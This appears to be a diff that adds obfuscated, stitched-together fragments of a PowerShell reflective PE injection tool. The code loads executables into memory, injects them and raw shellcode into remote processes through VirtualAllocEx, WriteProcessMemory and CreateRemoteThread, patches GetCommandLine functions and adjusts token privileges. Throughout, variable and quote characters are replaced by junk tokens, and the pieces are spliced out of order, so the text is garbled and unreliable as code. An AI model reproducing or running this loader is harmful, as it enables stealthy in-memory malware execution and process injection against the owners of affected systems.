+		CXljAssemblyBuilder = CXljDomain.DefineDynamicAssembly(CXljDynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+		CXljModuleBuilder = CXljAssemblyBuilder.DefineDynamicModule(e9MjDynamicModulee9Mj, CXljfalse)
+		CXljConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+
+
+		############    ENUM    ############
+		#Enum MachineType
+		CXljTypeBuilder = CXljModuleBuilder.DefineEnum(e9MjMachineTypee9Mj, e9MjPublice9Mj, [UInt16])
+		CXljTypeBuilder.DefineLiteral(e9MjNativee9Mj, [UInt16] 0) Jbi write-host
+		CXljTypeBuilder.De','= [AppDomain]::CurrentDomain.GetAssemblies() Jbi
+	        Where-Object { CXlj_.GlobalAssemblyCache -And CXlj_.Location.Split(e9MjIjbfIjbfe9Mj)[-1].Equals(e9MjSystem.dlle9Mj) }
+	    CXljUnsafeNativeMethods = CXljSystemAssembly.GetType(e9MjMicrosoft.Win32.UnsafeNativeMethodse9Mj)
+	    # Get a reference to the GetModuleHandle and GetProcAddress methods
+	    CXljGetModuleHandle = CXljUnsafeNativeMethods.GetMethod(e9MjGetModuleHandlee9Mj)
+	    CXljGetProcAddress = CXljUnsafeNativeMethods.GetMethod(e9MjGetProcAddresse9Mj)
+	    # ','ublice9Mj)).SetOffset(68) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjDllCharacteristicse9Mj, CXljDllCharacteristicsType, e9MjPublice9Mj)).SetOffset(70) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfStackReservee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(72) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfStackCommite9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(76) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfHeapReservee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(80) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfHeapCommite9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(84) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjLoaderFlagse9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(88) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjNumberOfRvaAndSizese9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(92) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjExportTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(96) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjImportTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(104) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjResourceTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(112) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjExceptionTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(120) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjCertificateTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(128) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjBaseRelocationTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(136) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjDebuge9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(144) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjArchitecturee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(152) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjGlobalPtre9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(160) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjTLSTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(168) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjLoadConfigTablee9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(176) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjBoundImporte9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(184) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjIATe9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(192) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjDelayImportDescriptore9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(200) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjCLRRuntimeHeadere9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(208) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjReservede9Mj, CXljIMAGE_DATA_DIRECTORY, e9MjPublice9Mj)).SetOffset(216) Jbi write-host
+		CXljIMAGE_OPTIONAL_HEADER32 = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value CXljIMAGE_OPTIONAL_HEADER32
+
+		#Struct IMAGE_NT_HEADERS64
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		C','jOldProtectFlag) Jbi write-host
+			}
+		}
+		############################################','LUID_AND_ATTRIBUTES, e9MjPublice9Mj) Jbi write-host
+		CXljTOKEN_PRIVILEGES = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value CXljTOKEN_PRIVILEGES
+
+		return CXljWin32Types
+	}
+
+	Function Get-Win32Constants
+	{
+		CXljWin32Constants = New-Object System.Object
+		
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
+		CXljWin32Constants Jbi Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
+		CXljWin32Const','89, 0xdc, 0x5b, 0xc3)
+			
+			CXljSCLength = CXljLoadLibrarySC1.Length + CXljLoadLibrarySC2.Length + CXljLoadLibrarySC3.Length + CXljLoadLibrarySC4.Length + (CXljPtrSize * 3)
+			CXljSCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljSCLength)
+			CXljSCPSMemOriginal = CXljSCPSMem
+			
+			Write-BytesToMemory -Bytes CXljLoadLibrarySC1 -MemoryAddress CXljSCPSMem
+			CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljLoadLibrarySC1.Length)
+			[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljRImportDllPathPtr, CXljSCPSMem, CXljfalse)
+			CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+			Write-BytesToMemory -Bytes CXljLoadLibrarySC2 -MemoryAddress CXljSCPSMem
+			CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljLoadLibrarySC2.Length)
+			[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljLoadLibraryAAddr, CXljSCPSMem, CXljfalse)
+			CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+			Write-BytesToMemory -Bytes CXljLoadLibrarySC3 -MemoryAddress CXljSCPSMem
+			CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljLoadLibrarySC3.Length)
+			[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljLoadLibraryARetMem, CXljSCPSMem, CXljfalse)
+			CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+			Write-BytesToMemory -Bytes CXljLoadLibrarySC4 -MemoryAddress CXljSCPSMem
+			CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljLoadLibrarySC4.Length)
+
+			
+			CXljRSCAddr = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]CXljSCLength, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_EXECUTE_READWRITE)
+			if (CXljRSCAddr -eq [IntPtr]::Zero)
+			{
+				Throw GEy9Unable to allocate memory in the remote process for shellcodeGEy9
+			}
+			
+			CXljSuccess = CXljWin32Functions.WriteProcessMemory.Invoke(CXljRemoteProcHandle, CXljRSCAddr, CXljSCPSMemOriginal, [UIntPtr][UInt64]CXljSCLength, [Ref]CXljNumBytesWritten)
+			if ((CXljSuccess -eq CXljfalse) -or ([UInt64]CXljNumBytesWritten -ne [UInt64]CXljSCLength))
+			{
+				Throw GEy9Unable to write shellcode to remote process memory.GEy9
+			}
+			
+			CXljRThreadHandle = Create-RemoteThread -ProcessHandle CXljRemoteProcHandle -StartAddress CXljRSCAddr -Win32Functions CXljWin32Functions
+			CXljResult = CXljWin32Functions.WaitForSingleObject.Invoke(CXljRThreadHandle, 20000)
+			if (CXljResult -ne 0)
+			{
+				Throw GEy9Call to CreateRemoteThread to call GetProcAddress failed.GEy9
+			}
+			
+			#The shellcode writes the DLL address to memory in the remo','n32Types Jbi Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value CXljLUID_AND_ATTRIBUTES
+		
+		#Struct TOKEN_PRIVILEGES
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjTOKEN_PRIVILEGESe9Mj, CXljAttributes, [System.ValueType], 16)
+		CXljTypeBuilder.DefineField(e9MjPrivilegeCounte9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjPrivilegese9Mj, CXlj','jPEBytes, CXljFuncReturnType, CXljProcId, CXljProcName,CXljForceASLR) -ComputerName CXljComputerName
+	}
+}
+
+Main
+}
+','write-host
+		CXljTypeBuilder.DefineField(e9MjBasee9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjNumberOfFunctionse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjNumberOfNamese9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjAddressOfFunctionse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjAddressOfNamese9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjAddressOfNameOrdinalse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_EXPORT_DIRECTORY = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value CXljIMAGE_EXPORT_DIRECTORY
+		
+		#Struct LUID
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjLUIDe9Mj, CXljAttributes, [System.ValueType], 8)
+		CXljTypeBuilder.DefineField(e9MjLowParte9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjHighParte9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljLUID = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name LUID -Value CXljLUID
+		
+		#Struct LUID_AND_ATTRIBUTES
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjLUID_AND_ATTRIBUTESe9Mj, CXljAttributes, [System.ValueType], 12)
+		CXljTypeBuilder.DefineField(e9MjLuide9Mj, CXljLUID, e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjAttributese9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljLUID_AND_ATTRIBUTES = CXljTypeBuilder.CreateType()
+		CXljWi','jWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_EXECUTE_READWRITE)
+			}
+			CXljEffectivePEHandle = CXljPEHandle
+		}
+		
+		[IntPtr]CXljPEEndAddress = Add-SignedIntAsUnsigned (CXljPEHandle) ([Int64]CXljPEInfo.SizeOfImage)
+		if (CXljPEHandle -eq [IntPtr]::Zero)
+		{ 
+			Throw GEy9VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).GEy9
+		}		
+		[System.Runtime.InteropServices.Marshal]::Copy(CXljPEBytes, 0, CXljPEHandle, CXljPEInfo.SizeOfHeaders) Jbi write-host
+		
+		
+		#Now that the PE is in memory, get more detailed information about it
+		Write-Verbose GEy9Getting detailed PE information from the headers loaded in memoryGEy9
+		CXljPEInfo = Get-PEDetailedInfo -PEHandle CXljPEHandle -Win32Types CXljWin32Types -Win32Constants CXljWin32Constants
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name EndAddress -Value CXljPEEndAddress
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value CXljEffectivePEHandle
+		Write-Verbose GEy9StartAddress: CXlj(Get-Hex CXljPEHandle)    EndAddress: CXlj(Get-Hex CXljPEEndAddress)GEy9
+		
+		
+		#Copy each section from the PE in to memory
+		Write-Verbose GEy9Copy PE sections in to memoryGEy9
+		Copy-Sections -PEBytes CXljPEBytes -PEInfo CXljPEInfo -Win32Functions CXljWin32Functions -Win32Types CXljWin32Types
+		
+		
+		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
+		Write-Verbose GEy9Update memory addresses based on where the PE was actually loaded in memoryGEy9
+		Update-MemoryAddresses -PEInfo CXljPEInfo -OriginalImageBase CXljOriginalImageBase -Win32Constants CXljWin32Constants -Win32Types CXljWin32Types
+
+		
+		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
+		Write-Verbose GEy9Import DLLe9Mjs needed by the PE we are loadingGEy9
+		if (CXljRemoteLoading -eq CXljtrue)
+		{
+			Import-DllImports -PEInfo CXljPEInfo -Win32Functions CXljWin32Functions -Win32Types CXljWin32Types -Win32Constants CXljWin32Constants -RemoteProcHandle CXljRemoteProcHandle
+		}
+		else
+		{
+			Import-DllImports -PEInfo CXljPEInfo -Win32Functions CXljWin32Functions -Win32Types CXljWin32Types -Win32Constants CXljWin32Constants
+		}
+		
+		
+		#Update the memory protection flags for all the memory just allocated
+		if (CXljRemoteLoading -eq CXljfalse)
+		{
+			if (CXljNXCompatible -eq CXljtrue)
+			{
+				Write-Verbose GEy9Update memory protection flagsGEy9
+				Update-MemoryProtectionFlags -PEInfo CXljPEInfo -Win32Functions CXljWin32Functions -Win32Constants CXljWin32Constants -Win32Types CXljWin32Types
+			}
+			else
+			{
+				Write-Verbose GEy9PE being reflectively loaded is not compatible with NX memory, keeping memory as read write executeGEy9
+			}
+		}
+		else
+		{
+			Write-Verbose GEy9PE being loaded in to a remote process, not adjusting memory permissionsGEy9
+		}
+		
+		
+		#If remote loading, copy the DLL in to remote process memory
+		if (CXljRemoteLoading -eq CXljtrue)
+		{
+			[UInt32]CXljNumBytesWritten = 0
+			CXljSuccess = CXljWin32Functions.WriteProcessMemory.Invoke(CXljRemoteProcHandle, CXljEffectivePEHandle, CXljPEHandle, [UIntPtr](CXljPEInfo.SizeOfImage), [Ref]CXljNumBytesWritten)
+			if (CXljSuccess -eq CXljfalse)
+			{
+				Throw GEy9Unable to write shellcode to remote process memory.GEy9
+			}
+		}
+		
+		
+		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
+		if (CXljPEInfo.FileType -ieq GEy9DLLGEy9)
+		{
+			if (CXljRemoteLoading -eq CXljfalse)
+			{
+				Write-Verbose GEy9Calling dllmain so the DLL knows it has been loadedGEy9
+				CXljDllMainPtr = Add-SignedIntAsUnsigned (CXljPEInfo.PEHandle) (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+				CXljDllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+				CXljDllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljDllMainPtr, CXljDllMainDelegate)
+				
+				CXljDllMain.Invoke(CXljPEInfo.PEHandle, 1, [IntPtr]::Zero) Jbi write-host
+			}
+			else
+			{
+				CXljDllMainPtr = Add-SignedIntAsUnsigned (CXljEffectivePEHandle) (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+','n32Functions.AdjustTokenPrivileges.Invoke(CXljThreadToken, CXljfalse, CXljTokenPrivilegesMem, CXljTokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
+		CXljErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
+		if ((CXljResult -eq CXljfalse) -or (CXljErrorCode -ne 0))
+		{
+			#Throw GEy9Unable to call AdjustTokenPrivileges. Return value: CXljResult, Errorcode: CXljErrorCodeGEy9   #todo need to detect if already set
+		}
+		
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(CXljTokenPrivilegesMem)
+	}
+	
+	
+	Function Create-RemoteThread
+	{
+		Param(
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljProcessHandle,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljStartAddress,
+		
+		[Parameter(Position = 3, Mandatory = CXljfalse)]
+		[IntPtr]
+		CXljArgumentPtr = [IntPtr]::Zero,
+		
+		[Parameter(Position = 4, Mandatory = CXljtrue)]
+		[Sy','ode1 += 0xb8
+		
+		[Byte[]]CXljShellcode2 = @(0xc3)
+		CXljTotalSize = CXljShellcode1.Length + CXljPtrSize + CXljShellcode2.Length
+		
+		
+		#Make copy of GetCommandLineA and GetCommandLineW
+		CXljGetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljTotalSize)
+		CXljGetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljTotalSize)
+		CXljWin32Functions.memcpy.Invoke(CXljGetCommandLineAOrigBytesPtr, CXljGetCommandLineAAddr, [UInt64]CXljTotalSize) Jbi write-host
+		CXljWin32Functions.memcpy.Invoke(CXljGetCommandLineWOrigBytesPtr, CXljGetCommandLineWAddr, [UInt64]CXljTotalSize) Jbi write-host
+		CXljReturnArray += ,(CXljGetCommandLineAAddr, CXljGetCommandLineAOrigBytesPtr, CXljTotalSize)
+		CXljReturnArray += ,(CXljGetCommandLineWAddr, CXljGetCommandLineWOrigBytesPtr, CXljTotalSize)
+
+		#Overwrite GetCommandLineA
+		[UInt32]CXljOldProtectFlag = 0
+		CXljSuccess = CXljWin32Functions.VirtualProtect.Invoke(CXljGetCommandLineAAddr, [UInt32]CXljTotalSize, [UInt32](CXljWin32Constants.PAGE_EXECUTE_READWRITE), [Ref]CXljOldProtectFlag)
+		if (CXljSuccess = CXljfalse)
+		{
+			throw GEy9Call to VirtualProtect failedGEy9
+		}
+		
+		CXljGetCommandLineAAddrTemp = CXljGetCommandLineAAddr
+		Write-BytesToMemory -Bytes CXljShellcode1 -MemoryAddress CXljGetCommandLineAAddrTemp
+		CXljGetCommandLineAAddrTemp = Add-SignedIntAsUnsigned CXljGetCommandLineAAddrTemp (CXljShellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljCmdLineAArgsPtr, CXljGetCommandLineAAddrTemp, CXljfalse)
+		CXljGetCommandLineAAddrTemp = Add-SignedIntAsUnsigned CXljGetCommandLineAAddrTemp CXljPtrSize
+		Write-BytesToMemory -Bytes CXljShellcode2 -MemoryAddress CXljGetCommandLineAAddrTemp
+		
+		CXljWin32Functions.VirtualProtect.Invoke(CXljGetCommandLineAAddr, [UInt32]CXljTotalSize, [UInt32]CXljOldProtectFlag, [Ref]CXljOldProtectFlag) Jbi write-host
+		
+		
+		#Overwrite GetCommandLineW
+		[UInt32]CXljOldProtectFlag = 0
+		CXljSuccess = CXljWin32Functions.VirtualProtect.Invoke(CXljGetCommandLineWAddr, [UInt32]CXljTotalSize, [UInt32](CXljWin32Constants.PAGE_EXECUTE_READWRITE), [Ref]CXljOldProtectFlag)
+		if (CXljSuccess = CXljfalse)
+		{
+			throw GEy9Call to VirtualProtect failedGEy9
+		}
+		
+		CXljGetCommandLineWAddrTemp = CXljGetCommandLineWAddr
+		Write-BytesToMemory -Bytes CXljShellcode1 -MemoryAddress CXljGetCommandLineWAddrTemp
+		CXljGetCommandLineWAddrTemp = Add-SignedIntAsUnsigned CXljGetCommandLineWAddrTemp (CXljShellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljCmdLineWArgsPtr, CXljGetCommandLineWAddrTemp, CXljfalse)
+		CXljGetCommandLineWAddrTemp = Add-SignedIntAsUnsigned CXljGetCommandLineWAddrTemp CXljPtrSize
+		Write-BytesToMemory -Bytes CXljShellcode2 -MemoryAddress CXljGetCommandLineWAddrTemp
+		
+		CXljWin32Functions.VirtualProtect.Invoke(CXljGetCommandLineWAddr, [UInt32]CXljTotalSize, [UInt32]CXljOldProtectFlag, [Ref]CXljOldProtectFlag) Jbi write-host
+		#################################################
+		
+		
+		#################################################
+		#For C++ stuff that is compiled with visual studio as GEy9multithreaded DLLGEy9, the above method of overwriting GetCommandLine doesne9Mjt work.
+		#	I do','jCarryOver = 0
+			for (CXlji = 0; CXlji -lt CXljValue1Bytes.Count; CXlji++)
+			{
+				#Add bytes
+				[UInt16]CXljSum = CXljValue1Bytes[CXlji] + CXljValue2Bytes[CXlji] + CXljCarryOver
+
+				CXljFinalBytes[CXlji] = CXljSum -band 0x00FF
+				
+				if ((CXljSum -band 0xFF00) -eq 0x100)
+				{
+					CXljCarryOver = 1
+				}
+				else
+				{
+					CXljCarryOver = 0
+				}
+			}
+		}
+		else
+		{
+			Throw GEy9Cannot add bytearrays of different sizesGEy9
+		}
+		
+		return [BitConverter]::ToInt64(CXljFinalBytes, 0)
+	}
+	
+
+	Function Compare-Val1GreaterThanVal2AsUInt
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[Int64]
+		CXljValue1,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[Int64]
+		CXljValue2
+		)
+		
+		[Byte[]]CXljValue1Bytes = [BitConverter]::GetBytes(CXljValue1)
+		[Byte[]]CXljValue2Bytes = [BitConverter]::GetBytes(CXljValue2)
+
+		if (CXljValue1Bytes.Count -eq CXljValue2Bytes.Count)
+		{
+			for (CXlji = CXljValue1Bytes.Count-1; CXlji -ge 0; CXlji--)
+			{
+				if (CXljValue1Bytes[CXlji] -gt CXljValue2Bytes[CXlji])
+				{
+					return CXljtrue
+				}
+				elseif (CXljValue1Bytes[CXlji] -lt CXljValue2Bytes[CXlji])
+				{
+					return CXljfalse
+				}
+			}
+		}
+		else
+		{
+			Throw GEy9Cannot compare byte arrays of different sizeGEy9
+		}
+		
+		return CXljfalse
+	}
+	
+
+	Function Convert-UIntToInt
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[UInt64]
+		CXljValue
+		)
+		
+		[Byte[]]CXljValueBytes = [BitConverter]::GetBytes(CXljValue)
+		return ([BitConverter]::ToInt64(CXljValueBytes, 0))
+	}
+
+
+    Function Get-Hex
+    {
+        Param(
+        [Parameter(Position = 0, Mandatory = CXljtrue)]
+        CXljValue #We will determine the type dynamically
+        )
+
+        CXljValueSize = [System.Runtime.Inter','SE_RELOCATION = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value CXljIMAGE_BASE_RELOCATION
+
+		#Struct IMAGE_IMPORT_DESCRIPTOR
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_IMPORT_DESCRIPTORe9Mj, CXljAttributes, [System.ValueType], 20)
+		CXljTypeBuilder.DefineField(e9MjCharacteristicse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjTimeDateStampe9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjForwarderChaine9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjNamee9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjFirstThunke9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_IMPORT_DESCRIPTOR = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value CXljIMAGE_IMPORT_DESCRIPTOR
+
+		#Struct IMAGE_EXPORT_DIRECTORY
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjIMAGE_EXPORT_DIRECTORYe9Mj, CXljAttributes, [System.ValueType], 40)
+		CXljTypeBuilder.DefineField(e9MjCharacteristicse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjTimeDateStampe9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjMajorVersione9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjMinorVersione9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjNamee9Mj, [UInt32], e9MjPublice9Mj) Jbi ','XljTokenPrivileges.PrivilegeCount = 1
+		CXljTokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljPLuid, [Type]CXljWin32Types.LUID)
+		CXljTokenPrivileges.Privileges.Attributes = CXljWin32Constants.SE_PRIVILEGE_ENABLED
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljTokenPrivileges, CXljTokenPrivilegesMem, CXljtrue)
+
+		CXljResult = CXljWi','dersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name e9MjSizeOfImagee9Mj -Value (CXljNtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name e9MjSizeOfHeaderse9Mj -Value (CXljNtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name e9MjDllCharacteristicse9Mj -Value (CXljNtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
+		
+		#Free the memory allocated above, this isne9Mjt where we allocate the PE to memory
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(CXljUnmanagedPEBytes)
+		
+		return CXljPEInfo
+	}
+
+
+	#PEInfo must contain the following NoteProperties:
+	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
+	Function Get-PEDetailedInfo
+	{
+		Param(
+		[Parameter( Position = 0, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljPEHandle,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		','ExitCodeThread -Value CXljGetExitCodeThread
+		
+		CXljOpe','ite the PE to memory. If the PE supports ASLR, allocate to a random memory address
+		Write-Verbose GEy9Allocating memory for the PE and write its headers to memoryGEy9
+		
+        #ASLR check
+		[IntPtr]CXljLoadAddr = [IntPtr]::Zero
+        CXljPESupportsASLR = (CXljPEInfo.DllCharacteristics -band CXljWin32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq CXljWin32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
+		if ((-not CXljForceASLR) -and (-not CXljPESupportsASLR))
+		{
+			Write-Warning GEy9PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)GEy9 -WarningAction Continue
+			[IntPtr]CXljLoadAddr = CXljOriginalImageBase
+		}
+        elseif (CXljForceASLR -and (-not CXljPESupportsASLR))
+        {
